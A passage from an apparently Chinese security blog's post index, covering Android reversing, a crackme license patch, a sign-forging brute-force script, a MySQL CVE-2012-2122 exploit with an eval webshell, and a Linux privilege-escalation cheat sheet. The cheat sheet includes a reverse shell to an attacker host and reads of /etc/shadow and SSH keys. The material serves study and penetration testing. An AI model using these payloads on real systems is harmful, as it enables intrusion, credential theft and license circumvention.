&quot;test1@test&quot; }, { &quot;openid&quot; : &quot;oDF3iY9WMaswOPWjCIp_f3Bnpljk&quot;, &quot;opercode&quot; : 2003, &quot;text&quot; : &quot;你好，有什么事情？&quot;, &quot;time&quot; : 1400563731, &quot;worker&quot; : &quot;test1@test&quot; } ], &quot;number&quot;:2, &quot;msgid&quot;:20165267 } 参数说明参数 说明 worker 完整客服帐号，格式为：帐号前缀@公众号微信号 openid 用户标识 opercode 操作码，2002（客服发送信息），2003（客服接收消息） text 聊天记录 time 操作时间，unix时间戳 参考资料： 1、微信公众平台开发概述 2、微信开放平台","categories":[],"tags":[{"name":"web安全","slug":"web安全","permalink":"/tags/web安全/"}]},{"title":"基于dvmDexFileOpenPartial的动态脱壳","slug":"基于dvmDexFileOpenPartial的动态脱壳","date":"2019-05-15T06:25:33.000Z","updated":"2019-07-26T09:55:41.915Z","comments":true,"path":"2019/05/基于dvmDexFileOpenPartial的动态脱壳/","link":"","permalink":"/2019/05/基于dvmDexFileOpenPartial的动态脱壳/","excerpt":"","text":"1、dvmDexFileOpenPartial脱壳原理基于libdvm.so下dvmDexFileOpenPartial的文件脱壳，当然如果是新版的加固方式一般不可行，因为会基本会重写dvmDexFileOpenPartial方法。如此，先了解一下libdvm.so的方法dvmDexFileOpenPartial是干什么的。 加密dex文件在软件运行时，必然会解密加载到内存中运行，而dvmDexFileOpenPartial方法的参数： int dvmDexFileOpenPartial(const void* addr, int len, DvmDex** ppDvmDex) 第一个参数代表dex文件的基地址，第二个参数代表dex文件的长度，第三个参数代表出参，dex文件的类，方法等信息。 方法的源码解读：从源码看Dex Dump于dvmDexFileOpenPartial原理 断点脱壳原理分析:dvmDexFileOpenPartial断点脱壳原理分析 示例APP：jscrack 由于使用的Android 4.4.4的环境，加载模式为Dalvik虚拟机模式，libdvm.so则是此模式下的文件，当然在Android 5.0以上取消了Dalvik模式，自然也不存在libdvm.so文件。dalvik虚拟机会把dex文件优化为odex文件,dvmDexFileOpenPartial则用来解析内存中优化过的dex文件，此时dex已经加载进内存，所以就可以dump出来了。 2、示例演示首先调试模式启动APP， adb forward tcp:23946 tcp:23946 #IDA端口转发 adb shell am start -D -n 包名/activity名 #调试模式启动APP adb shell ps | grep 包名 #获取APP的PID adb forward tcp:8700 jdwp:pid #进程端口转发 然后调整IDA的调试选项，如下： 选择对应的进程后，页面跳转，选择modules下的libdvm.so中的dvmDexFileOpenPartial方法，如下： 找到方法后，在其第一行下断点，如下情形。 然后转发jdb。此处jdb不可过早转发，不然下一步运行不到指定地址，将会跳过调试模式进入软件内。 jdb -connect com.sun.jdi.SocketAttach:hostname=127.0.0.1,port=8700 附加完成后可以看到CMD卡在回车处暂无回显，在IDA下运行F9到指定断点处自动下断。 单步运行F8一次即可，可以看到寄存器窗口中R0,R1的地址值。 在file选项中点击script command运行如下脚本。则可以在D盘下看到dump出来的dex文件。 static main(void){ auto fp, dex_addr, end_addr; fp = fopen(&quot;D:\\\\dump.dex&quot;, &quot;wb&quot;); end_addr = R0 + R1; for ( dex_addr=R0; dex_addr &lt; end_addr; dex_addr ++ ) fputc(Byte(dex_addr), fp); } 选择jadx打开dex文件，可以看到源码已dump成功。 3、系统差异此处使用Android 4.4.4，如果使用Android 5.0以上不存在lindvm.so，则需要在libart.so中对Openmemory函数下断，同样操作，保存R1,R2的值，R1代表基地址，R2代表长度。 脚本为 static main(void){ auto fp, dex_addr, end_addr; fp = fopen(&quot;D:\\\\dump.dex&quot;, &quot;wb&quot;); end_addr = R1 + R2; for ( dex_addr=R1; dex_addr &lt; end_addr; dex_addr ++ ) fputc(Byte(dex_addr), fp); } 参考文章： IDA动态调试脱壳步骤","categories":[],"tags":[{"name":"Android逆向","slug":"Android逆向","permalink":"/tags/Android逆向/"}]},{"title":"ISCC Android Crackme","slug":"ISCC-Android-Crackme","date":"2019-04-30T01:47:32.000Z","updated":"2019-07-26T09:56:02.225Z","comments":true,"path":"2019/04/ISCC-Android-Crackme/","link":"","permalink":"/2019/04/ISCC-Android-Crackme/","excerpt":"","text":"ISCC Android Crackme此为2013年ISCC的一道移动题，相对简单的题，懂点 ARM 指令就差不多了。对于新入手安卓逆向可以做做看来练手。要求是注册为企业版程序。以下分析是建立在伪代码基础上，然后分析修改点，修改ARM汇编。 题目下载：APP 通过反编译代码简单查看功能逻辑，首先是从onCreate函数开始，函数一开始就调用了MyApp的m变量，查看对应的反编译代码。 MyApp是一个native方法的调用，调用了三个方法。 分别是initSN()、saveSN()、work()。并且执行了initSN方法，因此函数应该是注册码的对比和效验功能。 然后在回到以上的代码执行，点击按钮“执行功能”，进入toast弹出界面，通过判断m值来执行是否触发注册方法，默认为0触发，如果注册成功则调用work()函数来做执行功能。查看doRegister，点击确认后，程序进入com.bfs.crackme1.RegActivity类下， 方法判断是否输入注册码，调用saveSN来保存输入的注册码，然后弹窗关闭自身线程。到此，也基本确认了initSN的方法和上文判断一致。 看完基本的Java层函数现在来看so文件的相关代码实现和流程。 查看so的一些函数表，可以看到定义了JNI_Onload，Java层执行System.loadLibrary()后，将执行此函数。同样从函数表中可以看出加密处理为MD5。查看JNI_Onload做了什么处理。 查看伪代码，使用RegisterNatives实现JNI，而RegisterNatives是来做什么处理的，可以查看如下文章： JNI：使用RegisterNatives方法传递和使用Java自定义类 而此处的作用基本可以看到是用来自定义函数命名，不然native中的函数名为Java_com_bfs_crackme1_MainActivity_initSN这种类型，下面只有n1、n2、n3来代替以上方法。 查看n1方法，读取sdcard下的reg.dat文件，来进行MD5效对，要求进行企业版注册，能看到的是注册成功将使用setValue进行对v1的赋值，其中按照MainActivity文件中的判断，猜测3为企业版MD5值。 n2则为如下，读写的形式来对reg.dat 进行重写。 work函数则为如下： 至此，函数名则分析清楚，n1对应initSN，n2对应saveSN，n3对应work。根据函数流程可以大概猜出判断行为：n2保存来自输入的参数的MD5-&gt;n1读取参数进行对应是否为注册值-&gt;注册成功则set到内存一个值-&gt;由work来读取这个值判断注册是否成功以及功能执行。 所以理论上说，patch点有如下处： 1、修改reg.dat为企业版的注册码，修改Java层代码让其不走注册函数。 2、解密MD5值，直接输入注册 3、修改n1，让其返回值永远为3 4、修改work函数获取的v2值。 修改时，发现第一种并不行，Java层参数值修改后，可能n2做了其他相关处理，第二种是可行，毕竟都获取到了注册码，但需要解密成功，此MD5只是简单的32345678。 第三种修改n1： 输入肯定为错误或者不输入值，因此只需要修改值为空或者其他未知情况下的返回值。 .text:0000133C CMP R0, #0 .text:00001340 MOVEQ R1, #4 .text:00001344 MOV R0, R7 .text:00001348 MOVNE R1, R8 修改为： .text:0000133C MOV R0, #3 .text:00001340 MOVEQ R1, #3 .text:00001344 MOV R0, R7 .text:00001348 MOVNE R1, R8 让其在未输入的情况下返回企业版的返回值。修改编译安装后，打开即为企业版。 第四种修改work: .text:000014A0 10 40 2D E9 STMFD SP!, {R4,LR} .text:000014A4 00 40 A0 E1 MOV R4, R0 .text:000014A8 6F FF FF EB BL n1 .text:000014AC 04 00 A0 E1 MOV R0, R4 .text:000014B0 35 FF FF EB BL getValue .text:000014B8 00 00 50 E3 CMP R0, #0 增加一条指令，修改为: .text:000014A0 10 40 2D E9 STMFD SP!, {R4,LR} .text:000014A4 00 40 A0 E1 MOV R4, R0 .text:000014A8 6F FF FF EB BL n1 .text:000014AC 04 00 A0 E1 MOV R0, R4 .text:000014B0 35 FF FF EB BL getValue .text:000014B4 03 00 A0 E3 MOV R0, #3 .text:000014B8 00 00 50 E3 CMP R0, #0 这样达到从getvalue获取返回值后，重新修改v2的值为3，让其无论什么情况下都自动判断为已注册企业版。 网上其他的分析文章，同样是修改n1函数，只不过修改方式是同时修改几个mov语句，让其都赋值3来跳转判断。 详细文章：简单Android CrackMe分析","categories":[],"tags":[{"name":"Android逆向","slug":"Android逆向","permalink":"/tags/Android逆向/"}]},{"title":"APP解密参数sign","slug":"APP解密参数sign","date":"2019-04-18T08:34:21.000Z","updated":"2019-07-26T09:56:16.713Z","comments":true,"path":"2019/04/APP解密参数sign/","link":"","permalink":"/2019/04/APP解密参数sign/","excerpt":"","text":"APP解密参数signAPP是公司自己的业务APP，没有加固，只做了代码混淆。本以为要对加密字段进行so文件的逆向，查看后发现是Java层的加密，相对较简单。 首先抓包查看加密字段和相关参数值，可以看到一共有四个参数，其中sign是加密验证完整性字段 利用AK逆向APP包，搜索sign字段信息，但是搜索结果过多，查找较困难，但是sign是一个data参数字段，因此尝试更换其他字段搜索。 搜索reqData字段可以看到，搜索结果就smali文件存在，第一个为程序包，查看代码，利用jd来查看反编译Java代码。 搜索字段，可以看到如下所示，以下字段可以看出，程序对其四个字段的获取都有代表的变量，而我们只需要获取sign的变量，localObject2。 变量的值来源为t包的b方法，可以明显看到，值为nonce，tiestamp, localObject1, t.f的相加值。而localObject1为reqData的值。 查看t.b的方法，方法如下，对字段进行sha-256加密。查看a方法 public static String b(String paramString) { return a(paramString, &quot;SHA-256&quot;); } 其中t.a的执行为对指定的参数进行指定的加密，利用传入参数来确定。 public static String a(String paramString1, String paramString2) { try { paramString2 = MessageDigest.getInstance(paramString2); paramString2.update(paramString1.getBytes()); paramString1 = a(paramString2.digest()); return paramString1; } catch (Exception paramString1) { paramString1.printStackTrace(); } return null; } 而t.f代表的是一段加密公钥，此处不在列出，利用在线工具查看加密结果是否一致。可以看到加密后的参数和抓到的包结果一致。 那么就可以利用我们自己生成加密参数的方式来进行测试，例如如下脚本，通过判断响应返回的字段来获取参数值，查看是否越权等信息。 #coding : utf-8 import hashlib import requests headers = { &#39;Content-Type&#39;: &#39;application/x-www-form-urlencoded&#39;, &#39;Accept-Encoding&#39;: &#39;gzip, deflate&#39;, &#39;Cookie&#39;: &#39;JSESSIONID=xxxxxxx&#39;, &#39;User-Agent&#39;: &#39;okhttp/3.4.1&#39; } for i in range(60200000, 60295558): sha = &#39;MIICdgIBADAN.....TMK63hMPgm25mbCD0vKhsQtcSDlzVwtOOoNlW5E8CQQDNXVwGolFCqU9lb5147AHc+&lt;INF&gt;&lt;action&gt;...&lt;/action&gt;&lt;hostId&gt;&#39;+str(i)+&#39;&lt;/hostId&gt;&lt;ver&gt;27&lt;/ver&gt;&lt;transNo&gt;1555571421812&lt;/transNo&gt;&lt;deviceType&gt;0&lt;/deviceType&gt;&lt;verNm&gt;3.3.1&lt;/verNm&gt;&lt;/INF&gt;LE8I2QTAFHJM3M.....1555571421812&#39; h = hashlib.sha256(sha) sha256 = h.hexdigest() data = &#39;reqData=&lt;INF&gt;&lt;action&gt;.....&lt;/action&gt;&lt;hostId&gt;&#39;+str(i)+&#39;&lt;/hostId&gt;&lt;ver&gt;27&lt;/ver&gt;&lt;transNo&gt;1555571421812&lt;/transNo&gt;&lt;deviceType&gt;0&lt;/deviceType&gt;&lt;verNm&gt;3.3.1&lt;/verNm&gt;&lt;/INF&gt;&amp;nonce=LE8I2QTAFHJM3MO.....&amp;timestamp=1555571421812&amp;sign=&#39;+sha256 r = requests.post(&#39;http://xxxxxx/api&#39;, data = data, headers=headers) if &#39;xxxxxx&#39; in r.text: print i","categories":[],"tags":[{"name":"Android逆向","slug":"Android逆向","permalink":"/tags/Android逆向/"}]},{"title":"MySQL历史漏洞分析","slug":"MySQL历史漏洞分析","date":"2019-04-12T06:05:30.000Z","updated":"2019-04-12T08:54:58.191Z","comments":true,"path":"2019/04/MySQL历史漏洞分析/","link":"","permalink":"/2019/04/MySQL历史漏洞分析/","excerpt":"","text":"MySQL历史漏洞分析前段时间公司一托管的老系统，被木马勒索，然后紧急处理了一下，此系统使用少，而且是外包托管阿里云，因此并没有影响其他系统。拿到这个系统后，查看端口服务时发现，数据库端口对外开放，ssh对外开放，然后根据对系统的核查，猜测有可能存在以下问题： 1、后台弱口令或者登陆绕过 2、mysql弱口令 3、ssh弱口令爆破 经过后来优先对外的端口审查，发现是数据库漏洞，MySQL的cve-2012-2122，身份验证漏洞。 简单的说就是MySQL对身份验证上存在缺陷，大概256次登陆认证就会出现一次认证成功。并不在乎密码的正确性。 漏洞介绍： https://seclists.org/oss-sec/2012/q2/493 漏洞原因： my_bool check_scramble(const uchar *scramble_arg, const char *message, const uint8 *hash_stage2) { SHA1_CONTEXT sha1_context; uint8 buf[SHA1_HASH_SIZE]; uint8 hash_stage2_reassured[SHA1_HASH_SIZE]; mysql_sha1_reset(&amp;sha1_context); /* create key to encrypt scramble */ mysql_sha1_input(&amp;sha1_context, (const uint8 *) message, SCRAMBLE_LENGTH); mysql_sha1_input(&amp;sha1_context, hash_stage2, SHA1_HASH_SIZE); mysql_sha1_result(&amp;sha1_context, buf); /* encrypt scramble */ my_crypt((char *) buf, buf, scramble_arg, SCRAMBLE_LENGTH); /* now buf supposedly contains hash_stage1: so we can get hash_stage2 */ mysql_sha1_reset(&amp;sha1_context); mysql_sha1_input(&amp;sha1_context, buf, SHA1_HASH_SIZE); mysql_sha1_result(&amp;sha1_context, hash_stage2_reassured); return memcmp(hash_stage2, hash_stage2_reassured, SHA1_HASH_SIZE); } 以上是问题出现的代码处，memcmp的返回值实际上是int，而my_bool却是char。那么在把int转换成char的时候，就有可能发生截断。比如，memcmp返回0×200，截断后变成了0，调用check_scramble函数的就误以为密码正确。 而此漏洞并不是版本通病是MySQL在编译时，需添加-fno-builtin，并且所使用的glibc是经SSE优化后的，只不过glibc是系统自带。 漏洞利用： 使用如下poc： for i in `seq 1 1000`; do mysql -u root --password=root -h 127.0.0.1 2&gt;/dev/null; done 环境采用vulhub的docker环境，测试成功后返回如下： 那么拿到数据库怎么尝试获取服务权限，可以获取数据库账号密码来维持对数据库的访问和root权限。 select user,password from mysql.user; MySQL密码加密由sha1加密后再unhex加密再sha1加密的字段，可以再md5等密码查询网站查找。如上密码为123456。 还可以使用导出的形式，利用如下： Select &#39;&lt;?php eval($_POST[cmd])?&gt;&#39; into outfile &#39;/var/www/html/a.txt&#39;; #这种需要知道web路径 同样也可以使用load_file来查看系统文件等 SELECT LOAD_FILE(&#39;/etc/passwd&#39;)","categories":[],"tags":[{"name":"渗透测试","slug":"渗透测试","permalink":"/tags/渗透测试/"}]},{"title":"逆向修改手机内核，绕过反调试","slug":"逆向修改手机内核，绕过反调试","date":"2019-04-02T05:59:49.000Z","updated":"2019-07-26T09:56:34.187Z","comments":true,"path":"2019/04/逆向修改手机内核，绕过反调试/","link":"","permalink":"/2019/04/逆向修改手机内核，绕过反调试/","excerpt":"","text":"逆向修改手机内核，绕过反调试Android 应用反调试里最常用的一种反调试方法是查看/proc/self/status的信息，如果 TracerPid 不为 0，就判断为正在被调试。因此修改手机的TracePid,让其值恒为零。 一、 提取 zImage 内核文件查找boot文件位置 find / | grep boot cd /dev/block/platform/7824900.sdhci/by-name/ 将boot导出为boot.img dd if=/dev/block/mmcblk0p22 of=/sdcard/boot.img 把boot转移到可以下载的目录，由于adb权限问题，复制到sd卡目录下。 adb pull /sdcard/boot.img d:\\a 然后下载bootimg解压boot文件： git clone https://github.com/pbatard/bootimg-tools.git make 此时已经生成二进制文件，在mkbootimg目录下，进入此目录使用unmkbootimg，提取kernel 提取原始zImage 将kernel文件复制为文件名为zImage.gz的文件，并使用010editor查找十六进制1f 8b 08 00，找到后把前面的数据全删掉，使文件变成标准的gzip压缩文件，这样子就可以使用gunzip解压了。 修改完成后，解压缩文件，提取zImage 二、 提位、修改关键代码zImage文件可以直接使用 IDA 去打开，但需要设置参数。（建议使用6.8版本，因为在索引函数时可以自动识别，而7.0则不可） 点击OK后，确定进入ARM，然后弹出此对话框，填入0xc0008000 原文要求修改函数指令来达到修改的效果，但在修改过程中发现，对不同kernel，最后查到的对应proc_pid_status函数操作指令不一致。 echo 0 &gt; /proc/sys/kernel/kptr_restrict 关闭符号屏蔽 再输入以下命令查看这两函数的地址 cat /proc/kallsyms |grep proc_pid_status cat /proc/kallsyms |grep __task_pid_nr_ns 为了避免修改出错刷入手机成砖的风险，采用了另一方式，shift+f12来打开字符串窗口，查找TracerPid，修改其后的占位符，把%d修改为0和%09(30 09)。 其对应的Hex窗口修改为如下所示： 使用gzip -n -f -9 zImage压缩修改后的内核裸文件，压缩后会比原来的小，必须比原来的文件小才可以。得到zImage.gz，我们使用010分别打开zImage.gz和boot.img，搜索1F 8B 08 00。按下insert键，将010改为overwrite，注意这里必须是覆盖，这样就不用考虑插入后大小的问题了，把zImage.gz的内容复制到boot.img的相应位置。boot.img会有两个1F 8B 08 00，修改第一个，把其中的十六进制改为zImage.gz文件的十六进制值，在edit选项中进行覆写。 修改完成后，刷入手机，利用SDK自带的fastboot。 adb reboot bootloader # 启动fastboot模式 fastboot flash boot boot.img #刷入boot分区 fastboot reboot #重启 调试查看 如想使用修改函数操作指令的方式可以参考原作者方式： 1、逆向修改手机内核，绕过反调试 2、逆向修改内核，绕过TracerPID反调试","categories":[],"tags":[{"name":"Android逆向","slug":"Android逆向","permalink":"/tags/Android逆向/"}]},{"title":"IDA动态调试","slug":"IDA动态调试","date":"2019-03-29T08:31:34.000Z","updated":"2019-07-26T09:56:06.610Z","comments":true,"path":"2019/03/IDA动态调试/","link":"","permalink":"/2019/03/IDA动态调试/","excerpt":"","text":"IDA 动态调试通常在APP逆向和破解时，某些重要的函数会以so文件的形式进行加载，所以，在想获得关键操作逻辑和修改某些函数时，就需要IDA来进行操作啦。以下使用IDA版本7.0，小米手机 1、上传Android_Server文件存放在安装目录下的dbgsrv目录中，7.0以后版本多了几个其他版本的Android_server文件，上传Android_server文件到手机目录中，并提升执行权限。 adb push android_server /data/local/tmp/ chmod 755 android_server adb forward tcp:23946 tcp:23946 执行后就可以显示正在监听23946端口，如果报错，一般是使用位数和系统不一致。 2、调试启动APP以调试模式启动app adb shell am start -D -n 包名/.MainActivity 手机界面显示等待调试中，便可以进行下一步了。 3、查看APP PID调试进程进行端口转发，查看进程对应PID。 adb shell ps | grep 包名 adb forward tcp:8700 jdwp:pid 8700端口一般为默认的本地调试端口，如果不一致，可以在DDMS中查看。 4、IDA附加进程附加进程调试时，有时候需要对，如下的选项进行勾选，一般在需要动态加载so文件，调试JNI_onload函数的时候需要，对于一般调试静态函数的，需要拦取执行后断点的，可能连调试模式启动app都不需要。 选择后，便可以在attach to process选项中查看到相应的可调试进程了。如果没有进程可能是你的APP不能调试，需要添加可调试参数。或者直接修改ro.debuggable=1。 5、JDB附加执行jdb附加 jdb -connect com.sun.jdi.SocketAttach:hostname=127.0.0.1,port=8700 6、调试选择选择完成后，进入调试状态，在右边的modules栏可以看到加载进来的so文件。选择需要调试的so文件，如果没有看到需要的so文件，说明so文件是动态加载的，这时候F9运行，就可以看到相应的so文件了。 选择相应的so文件后，会显示so文件中的函数，选择对于函数即可。 7、调试断点如选择对于的JNI_Onload 函数，这时候界面会跳转到函数的起始位置，当然也可以使用基地址加偏移地址的方式寻找。找到函数位置后就可以F2下断点了。 断点执行后，点击F9再次运行，程序就可以执行到断点位置，当然有些是需要配合界面操作来执行。由于以上是抓取JNI_Onload函数，直接运行即可。 利用F8步过，F7步入进行调试即可。 对于调试结果，可以查看右侧寄存器变化，和下面的Hex View 变化值，来查看是否有需要的执行结果和函数值。","categories":[],"tags":[{"name":"Android逆向","slug":"Android逆向","permalink":"/tags/Android逆向/"}]},{"title":"基本Linux权限提升","slug":"基本Linux权限提升","date":"2019-03-18T05:49:53.000Z","updated":"2019-03-18T05:50:20.054Z","comments":true,"path":"2019/03/基本Linux权限提升/","link":"","permalink":"/2019/03/基本Linux权限提升/","excerpt":"","text":"原文链接：https://blog.g0tmi1k.com/2011/08/basic-linux-privilege-escalation/ 基本Linux权限提升枚举是关键。（Linux）权限升级就是： 收集 - *枚举，更多枚举和更多枚举。* 流程 - 对数据进行排序，分析和确定优先级。 搜索 - 了解要搜索的内容以及在何处查找漏洞利用代码。 适应 - *自定义漏洞利用，因此适合。并非每个漏洞利用都适用于每个系统“开箱即用”。* 尝试 - 为（大量）试验和错误做好准备。 操作系统什么是分销类型？什么版本？cat /etc/issue cat /etc/*-release cat /etc/lsb-release # Debian based cat /etc/redhat-release # Redhat based 什么是内核版本？是64位吗？cat /proc/version uname -a uname -mrs rpm -q kernel dmesg | grep Linux ls /boot | grep vmlinuz- 从环境变量中可以学到什么？cat /etc/profile cat /etc/bashrc cat ~/.bash_profile cat ~/.bashrc cat ~/.bash_logout env set 有打印机吗？lpstat -a 应用与服务正在运行什么服务？哪个服务具有哪个用户权限？ps aux ps -ef top cat /etc/services root运行了哪些服务？在这些易受攻击的服务中，值得仔细检查！ps aux | grep root ps -ef | grep root 安装了哪些应用程序？它们是什么版本的？他们目前正在运行吗？ls -alh /usr/bin/ ls -alh /sbin/ dpkg -l rpm -qa ls -alh /var/cache/apt/archivesO ls -alh /var/cache/yum/ 任何服务设置配置错误？是否附加了任何（易受攻击的）插件？cat /etc/syslog.conf cat /etc/chttp.conf cat /etc/lighttpd.conf cat /etc/cups/cupsd.conf cat /etc/inetd.conf cat /etc/apache2/apache2.conf cat /etc/my.conf cat /etc/httpd/conf/httpd.conf cat /opt/lampp/etc/httpd.conf ls -aRl /etc/ | awk &#39;$1 ~ /^.*r.*/ 安排了哪些工作？crontab -l ls -alh /var/spool/cron ls -al /etc/ | grep cron ls -al /etc/cron* cat /etc/cron* cat /etc/at.allow cat /etc/at.deny cat /etc/cron.allow cat /etc/cron.deny cat /etc/crontab cat /etc/anacrontab cat /var/spool/cron/crontabs/root 任何纯文本用户名和/或密码？grep -i user [filename] grep -i pass [filename] grep -C 5 &quot;password&quot; [filename] find . -name &quot;*.php&quot; -print0 | xargs -0 grep -i -n &quot;var $password&quot; # Joomla 通信与网络系统有哪些NIC？它是否连接到另一个网络？/sbin/ifconfig -a cat /etc/network/interfaces cat /etc/sysconfig/network 什么是网络配置设置？你能从这个网络中找到什么？DHCP服务器？DNS服务器？网关？cat /etc/resolv.conf cat /etc/sysconfig/network cat /etc/networks iptables -L hostname dnsdomainname 其他用户和主机与系统进行通信的是什么？lsof -i lsof -i :80 grep 80 /etc/services netstat -antup netstat -antpx netstat -tulpn chkconfig --list chkconfig --list | grep 3:on last w 什么缓存？IP和/或MAC地址arp -e route /sbin/route -nee 数据包嗅探可能吗？可以看到什么tcpdump tcp dst 192.168.1.7 80 and tcp dst 10.5.5.252 21 注意：tcpdump tcp dst [ip] [port]和tcp dst [ip] [port] 你有壳吗？你能和系统互动吗？nc -lvp 4444 # Attacker. Input (Commands) nc -lvp 4445 # Attacker. Ouput (Results) telnet [atackers ip] 44444 | /bin/sh | [local ip] 44445 # On the targets system. Use the attackers IP! ` 注意：http：//lanmaster53.com/2011/05/7-linux-shells-using-built-in-tools/ 端口转发可能吗？重定向并与来自其他视图的流量进行交互注意：http：//www.boutell.com/rinetd/ 注意：http：//www.howtoforge.com/port-forwarding-with-rinetd-on-debian-etch 注意：http：//downloadcenter.mcafee.com/products/tools/foundstone/fpipe2_1.zip 注意：FPipe.exe -l [本地端口] -r [远程端口] -s [本地端口] [本地IP] FPipe.exe -l 80 -r 80 -s 80 192.168.1.7 注意：ssh - [L / R] [本地端口]：[远程ip]：[远程端口] [本地用户] @ [本地ip] ssh -L 8080:127.0.0.1:80 root@192.168.1.7 # Local Port ssh -R 8080:127.0.0.1:80 root@192.168.1.7 # Remote Port 注意：mknod backpipe p; nc -l -p [远程端口] 反向管道 mknod backpipe p ; nc -l -p 8080 &lt; backpipe | nc 10.5.5.151 80 &gt;backpipe # Port Relay mknod backpipe p ; nc -l -p 8080 0 &amp; &lt; backpipe | tee -a inflow | nc localhost 80 | tee -a outflow 1&gt;backpipe # Proxy (Port 80 to 8080) mknod backpipe p ; nc -l -p 8080 0 &amp; &lt; backpipe | tee -a inflow | nc localhost 80 | tee -a outflow &amp; 1&gt;backpipe # Proxy monitor (Port 80 to 8080) 隧道可能吗？远程本地发送命令ssh -D 127.0.0.1:9050 -N [username]@[ip] proxychains ifconfig 机密信息和用户你是谁？谁登录？谁已登录？那里还有谁？谁能做什么？id who w last cat /etc/passwd | cut -d: -f1 # List of users grep -v -E &quot;^#&quot; /etc/passwd | awk -F: &#39;$3 == 0 { print $1}&#39; # List of super users awk -F: &#39;($3 == &quot;0&quot;) {print}&#39; /etc/passwd # List of super users cat /etc/sudoers sudo -l 可以找到哪些敏感文件？cat /etc/passwd cat /etc/group cat /etc/shadow ls -alh /var/mail/ 家庭导演中有什么“有趣”的东西？如果可以访问ls -ahlR /root/ ls -ahlR /home/ 是否有密码; 脚本，数据库，配置文件或日志文件？密码的默认路径和位置cat /var/apache2/config.inc cat /var/lib/mysql/mysql/user.MYD cat /root/anaconda-ks.cfg 用户正在做什么？是否有明文密码？他们在编辑什么？cat ~/.bash_history cat ~/.nano_history cat ~/.atftp_history cat ~/.mysql_history cat ~/.php_history 可以找到哪些用户信息？cat ~/.bashrc cat ~/.profile cat /var/mail/root cat /var/spool/mail/root 可以找到私钥信息吗？cat ~/.ssh/authorized_keys cat ~/.ssh/identity.pub cat ~/.ssh/identity cat ~/.ssh/id_rsa.pub cat ~/.ssh/id_rsa cat ~/.ssh/id_dsa.pub cat ~/.ssh/id_dsa cat /etc/ssh/ssh_config cat /etc/ssh/sshd_config cat /etc/ssh/ssh_host_dsa_key.pub cat /etc/ssh/ssh_host_dsa_key cat /etc/ssh/ssh_host_rsa_key.pub cat /etc/ssh/ssh_host_rsa_key cat /etc/ssh/ssh_host_key.pub cat /etc/ssh/ssh_host_key ` 文件系统哪些配置文件可以写在/ etc /中？能够重新配置服务吗？ls -aRl /etc/ | awk &#39;$1 ~ /^.*w.*/&#39; 2&gt;/dev/null # Anyone ls -aRl /etc/ | awk &#39;$1 ~ /^..w/&#39; 2&gt;/dev/null # Owner ls -aRl /etc/ | awk &#39;$1 ~ /^.....w/&#39; 2&gt;/dev/null # Group ls -aRl /etc/ | awk &#39;$1 ~ /w.$/&#39; 2&gt;/dev/null # Other find /etc/ -readable -type f 2&gt;/dev/null # Anyone find /etc/ -readable -type f -maxdepth 1 2&gt;/dev/null # Anyone ` 在/ var /中可以找到什么？ls -alh /var/log ls -alh /var/mail ls -alh /var/spool ls -alh /var/spool/lpd ls -alh /var/lib/pgsql ls -alh /var/lib/mysql cat /var/lib/dhcp3/dhclient.leases 网站上的任何设置/文件（隐藏）？有数据库信息的任何设置文件？ls -alhR /var/www/ ls -alhR /srv/www/htdocs/ ls -alhR /usr/local/www/apache22/data/ ls -alhR /opt/lampp/htdocs/ ls -alhR /var/www/html/ 日志文件中是否有任何内容（可以帮助“本地文件包含”！） cat /etc/httpd/logs/access_log cat /etc/httpd/logs/access.log cat /etc/httpd/logs/error_log cat /etc/httpd/logs/error.log cat /var/log/apache2/access_log cat /var/log/apache2/access.log cat /var/log/apache2/error_log cat /var/log/apache2/error.log cat /var/log/apache/access_log cat /var/log/apache/access.log cat /var/log/auth.log cat /var/log/chttp.log cat /var/log/cups/error_log cat /var/log/dpkg.log cat /var/log/faillog cat /var/log/httpd/access_log cat /var/log/httpd/access.log cat /var/log/httpd/error_log cat /var/log/httpd/error.log cat /var/log/lastlog cat /var/log/lighttpd/access.log cat /var/log/lighttpd/error.log cat /var/log/lighttpd/lighttpd.access.log cat /var/log/lighttpd/lighttpd.error.log cat /var/log/messages cat /var/log/secure cat /var/log/syslog cat /var/log/wtmp cat /var/log/xferlog cat /var/log/yum.log cat /var/run/utmp cat /var/webmin/miniserv.log cat /var/www/logs/access_log cat /var/www/logs/access.log ls -alh /var/lib/dhcp3/ ls -alh /var/log/postgresql/ ls -alh /var/log/proftpd/ ls -alh /var/log/samba/ Note: auth.log, boot, btmp, daemon.log, debug, dmesg, kern.log, mail.info, mail.log, mail.warn, messages, syslog, udev, wtmp ` 注：http：//www.thegeekstuff.com/2011/08/linux-var-log-files/ 如果命令有限，你会打破“监狱”外壳？python -c &#39;import pty;pty.spawn(&quot;/bin/bash&quot;)&#39; echo os.system(&#39;/bin/bash&#39;) /bin/sh -i 如何安装文件系统？mount df -h 是否有任何未安装的文件系统？cat /etc/fstab 使用了什么“高级Linux文件权限”？find / -perm -1000 -type d 2&gt;/dev/null # Sticky bit - Only the owner of the directory or the owner of a file can delete or rename here. find / -perm -g=s -type f 2&gt;/dev/null # SGID (chmod 2000) - run as the group, not the user who started it. find / -perm -u=s -type f 2&gt;/dev/null # SUID (chmod 4000) - run as the owner, not the user who started it. find / -perm -g=s -o -perm -u=s -type f 2&gt;/dev/null # SGID or SUID for i in `locate -r &quot;bin$&quot;`; do find $i \\( -perm -4000 -o -perm -2000 \\) -type f 2&gt;/dev/null; done # Looks in &#39;common&#39; places: /bin, /sbin, /usr/bin, /usr/sbin, /usr/local/bin, /usr/local/sbin and any other *bin, for SGID or SUID (Quicker search) # find starting at root (/), SGID or SUID, not Symbolic links, only 3 folders deep, list with more detail and hide any errors (e.g. permission denied) find / -perm -g=s -o -perm -4000 ! -type l -maxdepth 3 -exec ls -ld {} \\; 2&gt;/dev/null 哪里可以写入和执行？一些常见的地方：/ tmp，/ var / tmp，/ dev / shmfind / -writable -type d 2&gt;/dev/null # world-writeable folders find / -perm -222 -type d 2&gt;/dev/null # world-writeable folders find / -perm -o w -type d 2&gt;/dev/null # world-writeable folders find / -perm -o x -type d 2&gt;/dev/null # world-executable folders find / \\( -perm -o w -perm -o x \\) -type d 2&gt;/dev/null # world-writeable &amp; executable folders 任何“问题”文件？可写字，“无人”文件find / -xdev -type d \\( -perm -0002 -a ! -perm -1000 \\) -print # world-writeable files find /dir -xdev \\( -nouser -o -nogroup \\) -print # Noowner files 准备和寻找利用代码安装/支持哪些开发工具/语言？find / -name perl* find / -name python* find / -name gcc* find / -name cc 如何上传文件？find / -name wget find / -name nc* find / -name netcat* find / -name tftp* find / -name ftp 查找漏洞利用代码http://www.exploit-db.com http://1337day.com http://www.securiteam.com http://www.securityfocus.com 